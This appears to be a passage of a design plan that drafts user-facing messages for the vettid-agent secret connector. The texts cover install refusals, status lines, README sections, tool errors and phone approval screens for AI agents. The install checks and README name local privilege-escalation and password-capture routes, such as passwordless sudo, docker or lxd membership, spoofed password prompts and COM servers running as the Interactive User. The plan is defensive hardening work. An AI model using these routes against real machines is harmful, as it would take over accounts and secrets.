- **Administrator member, install stops, Linux** (`vettid-agent install` on Linux, 0.1.20, GC #16214 a, #16258 a, #16331 a-a; AGENT-LINUX-RUNTIME §11), NEW, one of four by the result. When the account can become an administrator with no password: "<user> can become an administrator on this computer without typing a password (<reason>). The connector's own account protects its keys only from programs that can't, so it cannot be installed for this one. Remove that, or ask your administrator to, or make a standard account for the agent, and run this again." <reason> is one of: "a sudo rule that asks for no password", "a sudo setting that skips the password", "sudo doesn't ask again for more than a day", "a doas rule that asks for no password", "a login setting that skips the password", "a polkit rule that lets it <action id> without a password", "its password is empty", "the password of <account> is empty", "<account> also has the administrator's user number", "membership of the <group> group", "access to <service>, which runs as an administrator", "it can change <file>, which decides who is an administrator". When the account can read or type what the keys or the password pass through: "<user> is in the <group> group, which can <read or type every keystroke, the administrator's password included | read the password hashes | read the computer's memory>. The connector's own account cannot protect its keys from it, so it cannot be installed for this one. Remove <user> from that group (it then signs out and in again), or make a standard account for the agent, and run this again." On Fedora, for the package grant: "<user> can install or remove signed software on this computer without typing a password, and installing software runs it as an administrator. Make those actions ask for the password with the rules file the README gives (<path>), then run this again." When a check could not be made: "The connector could not check <what> for <user>. It installs only for an account it has checked. <What to fix>, and run this again." At a run start or a proxy's opening, a check that could not be made: "The connector could not check <what> just now, so this was refused. Try again in a minute." <what> and <what to fix> name the file, the setting, the module, the program or the service, never its contents.
- **Administrator member, Linux** (`member_is_admin`, the stub, any tool, on Linux, 0.1.20, GC #16214 a), NEW: "Your account can become an administrator on this computer without typing a password (<reason>), so the connector in its own account can't keep its keys from your programs. Remove that, or ask your administrator to, and then run, in a terminal where no agent runs: /usr/bin/sudo /usr/local/libexec/vettid-agent/vettid-agent status --name <n>. Or use a standard account for the agent, or the connector in your own account, as the README says (it can use secrets, but not run programs or open proxies)." For a group, the Fedora package grant and a check not made, the first sentence is the matching one from the install texts, in the second person; after leaving a group: "sign out and in again first".
- **Status, administrator check, Linux** (the member's `vettid-agent status` on Linux, 0.1.20), NEW. For a member who can use sudo with a password: "Programs you run can't run programs as an administrator unless your password is typed. After you use sudo in a terminal, sudo doesn't ask again in that terminal for <minutes> minutes, so programs there can; and a program already running in your account can capture your password when you type it. Checked <time>." For a member who can't use sudo: "Your account can't become an administrator without an administrator's password, so programs you run aren't given a way to reach the connector's keys. Checked <time>." Then one line per reported setting: "sudo doesn't ask again in any terminal once you've typed your password" / "sudo doesn't ask again for <minutes> minutes" / "doas doesn't ask again for a while" / "polkit doesn't ask again for a few minutes" / "Your account can read the system logs: a program a run starts must not write a secret to them" / "Your account can read the screen on some computers" / "Your account can write to other terminals" / "polkit lets your account <action> without a password".
- **README, sudo password** (0.1.20, GC #16214 a), NEW, added to the README's section on running commands on Linux: "On Linux the connector's keys are protected by your password: programs you run can't run programs as an administrator unless it is typed. That protection has limits. For a few minutes after you use sudo in a terminal, sudo doesn't ask again there, so programs in that terminal can become an administrator. A program already running in your account can show a password prompt of its own, read what you type, or have changed your shell's start-up files earlier, and so capture your password. Run the commands above that start with /usr/bin/sudo in a terminal where no agent runs, preferably a new one after signing in again, and type your password only into a command you started yourself. If your account can become an administrator without typing a password (a sudo rule that asks for none, an empty password, or membership of a group such as docker), the connector refuses to run programs or open proxies for it, and says why. On Fedora, the stock settings let your account install software without a password; make that ask for the password with this rules file, then install again: <the file's path and contents>. The account can read the system logs if it is in adm or systemd-journal (Ubuntu's first user is): a program you let a run start must not write a secret to them. On Ubuntu Server the first user is also in lxd, which counts as an administrator: use another account for the agent there."
- **Administrator member, install stops** (`vettid-agent install` on Windows, 0.1.17, GC #15862 a), NEW: "<user> is an administrator on this computer. The connector's own account protects its keys only from a standard account, so it cannot be installed for this one. Make a standard account for daily use and the agent, and run this again naming it." With UAC off: "User Account Control is off on this computer, so every program runs with full rights and the connector cannot protect its keys. Turn it on and run this again." For the built-in Administrator the first text is used.
- **Administrator member** (`member_is_admin`, the stub, any tool, on Windows; on Linux the text below; 0.1.17, GC #15862 a), NEW: "Your account is an administrator on this computer, so the connector in its own account does not work for it: it cannot protect its keys from an administrator's programs. Use a standard account for the agent, or use the connector in your own account, as the README says (it can use secrets, but not run programs or open proxies)."
- **Configuration refused** (`config_refused`, the stub, 0.1.17), NEW: "The connector's settings are not as they should be, so this program did not use them. Tell your administrator to run `vettid-agent install --upgrade`."
- **Some output files not copied back, binding changed** (the run's answer, 0.1.17), NEW: "Files were not copied back: the folder is no longer allowed for this item."
- **Some output files not copied back** (the run's answer, with the result, 0.1.17), NEW, shown only when it applies: "Some files were not copied back: <names> (too many or too large, not a plain file, or not named in the request)." And, for a file that held the secret: "These files had the secret replaced before they were copied back: <names>."
- **Runs and proxies off** (`status` of the same-account connector, 0.1.16), NEW: "Runs and proxies are off: the connector runs in this agent's account."
- **No service** (`service_not_running`; the stub, any tool when the channel is missing, 0.1.16), NEW. Windows: "The connector service is not running. Start it from Services, or ask your administrator to run `vettid-agent install --upgrade`." Linux and macOS (a member cannot start a system service): "The connector service is not running. Tell your administrator."
- **Versions differ** (`versions_differ`; the stub, 0.1.16), NEW: "The connector service and this program are different versions. Ask your administrator to run `vettid-agent install --upgrade`." (A5.5 and A5.6 define `--upgrade`; A5.4 does not yet, owed.)
- **Secondary logon not started** (a run, Windows, 0.1.19, GC #15936), NEW: "The secondary logon service could not be started (it is disabled, or not allowed for the connector), so programs cannot be run. Ask your administrator to set the Secondary Logon service to Manual in Services and to check that the connector's service account may start it." `vettid-agent install` shows the same text as a warning when it finds the service Disabled or not startable by that account. (0.1.19, fix round) The text names the service account: "... check that the connector's service account (`vettid-agent-<n>`, the pairing's) may start it."
- **The run account could not sign in** (a run, Windows, 0.1.19, GC #15936), NEW: "The account the program runs in could not sign in: <reason>. Tell your administrator." The reason is named by the Windows error number: 1385, "it is not allowed to sign in at this computer's screen (the local sign-in right is missing)"; 1330, "its password has expired"; 1909, "it is locked out"; 1326, "its password is wrong"; 1907, "its password must be changed"; 1058, "the Secondary Logon service is disabled" (with the text above); any other, "Windows error <number>". Measured: 1385, 1907 and 1058; the others are documented, not measured. `status`, NEW, for a locked runner: "One of the connector's run accounts is locked out, so programs cannot run in it until an administrator unlocks it."
- **The program could not be started safely** (a run, Windows, 0.1.19, second review round, the lead's call), NEW: "The program could not be started safely (<step>)." `<step>` names the failed step (the desktop, the station entry, the report pipe, the output pipes, the job with its assignment and UI limits, the lock, an access list, the restricted token, the start, the launcher's report, the ids, the image, the job, the resume); `status` and the Event Log name it too. If removing the station entry or closing the desktop after a run fails, the slot stays out of use (below) and `status` names it.
- **Channel name taken** (`status`, 0.1.16), NEW: "Another program took the connector's channel name, so the service did not start. Restart the computer; if it happens again, tell your administrator."
- **A run slot out of use** (a run tool's answer when no slot can be used, 0.1.16), NEW: "No program can run now: the connector's run slots were not cleaned up after their last runs and stay out of use. Tell your administrator; `vettid-agent status` says which." When one slot is out of use and the other is busy, a new run is answered with this text, not "Two programs are already running". `status`, NEW, for one slot: "One of the connector's two run slots is out of use because it could not be cleaned up after a run; one program can run at a time."
- **No TPM 2.0, install stops** (`vettid-agent install` on Linux, 0.1.16, GC #15786 c), NEW: "This computer has no TPM 2.0, so the connector's keys cannot be tied to its hardware. To install anyway, run `vettid-agent install --no-tpm`: the keys are then protected by this computer's host key, which an administrator can read."
- **`--no-tpm` notice** (`install` with `--no-tpm`, 0.1.16), NEW: "Installed without a TPM 2.0: the connector's keys are protected by this computer's host key, which an administrator can read and which is not tied to this hardware."
- **Host key** (`status`, 0.1.16), NEW: "Keys: protected by this computer's host key, not a TPM 2.0 (installed with --no-tpm)."
- **`--no-tpm` with a TPM 2.0** (`install`, 0.1.16), NEW: "This computer has a TPM 2.0, so --no-tpm is not allowed. Run `vettid-agent install` without it."
- **Not paired, separate-account mode** (`status`, 0.1.16), NEW: "Not paired. Ask your administrator to run `vettid-agent pair --name <n>`, as the README says." This replaces the `--state-dir` text of the list below, and the "run `vettid-agent pair`" texts, in the mode (`pair` and `forget` are elevated there).
- **`--run-path` or `--run-env` given to a stub** (0.1.16), NEW: "--run-path and --run-env are set in the connector service's configuration by an administrator, not on this command."
- **`--run-path`, changeable, separate-account mode** (when the service reads its configuration, shown in `status` and the system log; 0.1.16), NEW: "--run-path <dir>: this folder, or a folder above it, can be changed by your account or by a user who is not an administrator. Use a folder only an administrator can change." The "(startup)" texts below are for the same-account connector.
- **`--run-env`, bad name** (startup), NEW: "--run-env <name>: this
  variable cannot be passed to programs."
- **`--run-env`, too many** (startup), NEW: "--run-env: at most 32
  names."
- **README**, NEW, in the section on running commands (0.1.16, rewritten for the separate-account mode; it applies once the mode is built, and until then the README says plainly that runs and proxies are not available): "The connector service is installed with `vettid-agent install` and runs in its own account. `install`, `pair`, `forget`, an upgrade and the uninstaller need an administrator; start them only as this README shows. The connector that runs in your own account can use items, list the catalog and reveal, but it cannot run programs or open proxies; run it as your normal user, never as an administrator or root. The first time a program runs with a secret, and after every update to it, your phone asks you to approve it and shows its fingerprint. Approving pins that exact file. The pin does not cover what the program loads or reads, such as its libraries or plugins. A run's program runs under a separate account, so the agent cannot read its secret, its files or its memory; the program itself sees the secret. On Windows the run's account may sign in at this computer's screen, and the first process of a run counts as an interactive sign-in; the program it starts gets the group "Interactive users" as deny-only, which closes Windows' default launch of COM servers set to run as "Interactive User" (a path into your own session) and anything else granted to that group. It does not close a COM server whose launch permission grants Authenticated Users, Everyone or Users: such a server can be launched by a run, as the Interactive User, which is you, in your own session. Do not give the group "Interactive users" access to anything you want kept from runs, and do not grant Authenticated Users, Everyone or Users launch permission on a COM server set to run as "Interactive User". If the account's password leaked, someone could sign in as it at the screen, or with `runas`, and would reach what any standard local account on this computer reaches, what this pairing shares, and the secrets and processes of runs in progress for that account, but not the connector's keys; keeping that account's processes alive only keeps its run slot out of use. Anyone who guesses the password can lock the account, which stops runs until an administrator unlocks it, and `vettid-agent status` says so. The account is denied network sign-in, so it cannot reach this computer's own shares through `\\localhost` or use WMI over the network. The sign-in log is documented to show a console sign-in for each run (not measured). Install programs, npm tools included, where only an administrator can change them. On Windows, for npm tools: `npm config set prefix "C:\Program Files\npm-global"`, then, after the first install, `icacls "C:\Program Files\npm-global" /setowner Administrators /T`, since Windows makes you the owner of a folder you create even as an administrator. On Linux and macOS, install global npm tools as root into a root-owned prefix such as `/usr/local`, never into your home folder. An administrator's `npm install -g` runs package scripts as an administrator, so install only packages you trust."
- **`leash.request_secret` description**, added: "The value becomes
  part of this conversation, and your app may keep it in its history.
  Use leash.execute_action, leash.run_with_secret or leash.open_proxy
  instead when one of them does the job."

Texts in vettid-agent `main` (`0016eea`) and its PR #34 that this plan
did not draft until now, quoted as the code has them, for approval in
one pass (tool errors with their code):

- **Still in flight** (`pending`, `waiting_for_approval` false): "Your
  vault has not answered yet. Check again with leash.check_status."
- **Approval timed out** (`approval_timeout`): "Your phone did not
  answer in time, and the request was dropped. Make it again if you
  still need it."
- **No result kept** (`expired`): "No result is kept for this request:
  a result is returned once and kept at most 10 minutes, and none
  survives a restart of the connector. Make the request again."
- **Session ended first** (`session_required`, a request): "Your access
  session ended before your vault ran this request. Try again."
- **No such field** (`not_found`): "That item has no such field, or the
  field cannot be used this way."
- **Too many held** (`limit`): "Too many requests are waiting for
  approval on your phone. Try again after you answer them."
- **Too many in flight** (`rate_limited_local`, requests): "Too many
  requests are waiting for your vault. Check their status, or try again
  later."
- **Unreadable answer** (`protocol_error`): "Your vault's answer could
  not be read."
- **Connection stopped** (`vault_unreachable`): "The connection to your
  vault has stopped."
- **Bad arguments** (`bad_request`): "The arguments do not match this
  tool's input schema."
- **Bad base64** (`bad_request`, `leash.execute_action`): "The request
  is not valid: data is not standard base64."
- **Local rate limit** (`rate_limited_local`): "Too many tool calls
  from this agent in a short time. Wait a moment and try again."
- **Too many running** (`rate_limited_local`): "Too many tool calls
  from this agent are still running. Wait for their answers and try
  again."
- **Internal** (`internal_error`): "The connector could not complete
  this request."
- **No such grant** (`not_granted`): "Your vault has given this agent
  no such grant. You can change its permissions on your phone."
- **Not presentable** (`not_presentable`): "This grant has no signed
  delegation. Issue it again on your phone."
- **No session for grants** (`session_required`, grants): "This agent
  has no access session with your vault, so its grants cannot be
  confirmed."
- **Grants unconfirmed** (`vault_unreachable`, grants): "This agent's
  grants could not be confirmed with your vault. Try again."
- **Quiet period** (`access_requested` or `access_denied`, appended to
  their texts): "No new request is sent before <15:04> (<reason>)."
  with the reasons "the last request was declined", "the last request
  was not answered", "your vault allows one request every 10 minutes"
  and "at most 6 requests an hour".
- **Unlinked, wipe failed**: "This agent was removed from your vault,
  but its keys could not be deleted from this computer (<error>). Run
  `vettid-agent mcp` again to retry, or delete the state directory (the
  protectors of this version keep no key outside it)."
- **In use**: "state directory is in use by another agent app".

Terminal texts of `vettid-agent pair`, `mcp` and `status` (same
source):

- "Contacting your vault…"
- "Resuming the pairing started earlier on this computer; the wait ends
  at <time>. Approve on your phone only if it shows the code this
  computer showed when the pairing started. If you are not sure a code
  was shown here, reject the pairing on your phone and start again."
- "Standard input is not read: an unfinished pairing is resumed
  instead. To start a new pairing, give the code as an argument or add
  --restart."
- "--passphrase is ignored: the resumed pairing keeps the protection it
  started with."
- "Replacing the earlier state in this state directory failed part of
  the way; it may be gone. Check with `vettid-agent status`."
- "The earlier state in this state directory was kept."
- "Pairing interrupted. To keep waiting, run `vettid-agent pair` again
  (without a code) before <time>; to start over, get a new code from
  your phone."
- "Pairing interrupted before a code to compare was shown; nothing was
  kept. Start again from your phone."
- "An unfinished pairing on this computer was discarded; its keys are
  deleted."
- "The state file that could not be opened was discarded."
- "The existing pairing on this computer was replaced; the old one
  stays listed on your phone until you remove it there."
- "no pairing code was given"; "could not read the pairing code from
  standard input"; "the pairing is not finished: run `vettid-agent
  pair`"; "the state file cannot be opened: <error>".
- `status`: "Not paired. Run `vettid-agent pair --state-dir <dir>`.";
  "Access session: <state> (as last saved; the vault is not
  contacted)", with the states "none", "active (its end is not
  known)", "active until <date>", "ended at <date>" and "not known yet
  (checked with your vault on first use)"; "Paired: not yet; waiting
  for approval on your phone until <time> (run `vettid-agent pair` to
  keep waiting)"; "Paired: no; an unfinished pairing timed out (the
  next `vettid-agent pair` discards it)"; "Paired: no; an unfinished
  pairing (the next `vettid-agent pair` discards it)"; "Keys: protected
  by <the TPM | Windows DPAPI for this user>, bound to this computer";
  "Read without taking the state directory's lock: if `vettid-agent
  mcp` runs for it, this is its last saved state."
- `status`, grants: "Grants: <n>, as your vault sent them on <date>";
  "Grants: none saved yet (listed from your vault when `vettid-agent
  mcp` has access)"; "Grants: the saved grants cannot be read (they are
  listed again from your vault when `vettid-agent mcp` next has
  access)"; "Paused by your vault after repeated refused requests: none
  can be used. You can resume this agent on your phone."; per grant
  "<scope>: asks on your phone" or "allowed automatically", then ", up
  to <n> an hour and <n> a day without asking", ", until <date>",
  ", connections <ids>", " (grant <id>)".

Android (drafts for the ANDROID-PLAN section of §7.4; Android's own
wording rules apply):

- **Pair an agent, code screen**: title "Pair an agent"; body "Copy this
  code to the computer where the agent runs. It works once and expires
  in 10 minutes."
- **Compare**: "Does the agent show 123 456? Approve only if the codes
  match."
- **Approve with access**: "Allow access for 1 hour" (with a length
  picker); "Agents act only while you allow access, and only within the
  permissions you give them."
- **Grant, ask mode**: "Ask me each time" / "Allow automatically, up to
  60 times an hour".
- **Agent request in Approvals**: "<agent> wants to read <item>" /
  "<agent> wants to use <item> without seeing it".
- **Reveal in Approvals** (AG13): "<agent> wants to see <item>. The
  agent's app may keep the value in its history."
- **Run in Approvals** (AG13): title "<agent> wants to run a program
  with <item>"; then "Program", "Arguments" (each in full), "Folder",
  "Secret given as" ("variable <NAME>", "standard input", "a temporary
  file"), "Other variables". Shell: "This runs a shell. The command can
  do anything with your secret." Inline code: "This runs code given on
  the command line. It can do anything with your secret." Unbound:
  "Any program could be asked for. Approve only a command you
  recognise."
- **Proxy in Approvals** (AG13): "<agent> wants to use <item> with
  <host> for <length>. The agent will not see it; the key is sent only
  to <host>." (0.1.14) Below it, the header's name and prefix from
  `approval.pending`'s `proxy` (VAULT-MESSAGING 0.92.0), and Deny only
  when it is missing; the wording is owed with AA8.
- **How an agent may use an item** (AG13): "Use without seeing it"
  (always on); "Run programs with it"; "Send it to an API for the
  agent"; "May be shown to agents", with "Off: the agent can use it
  without seeing it. On: the agent's app may keep the value in its
  history."
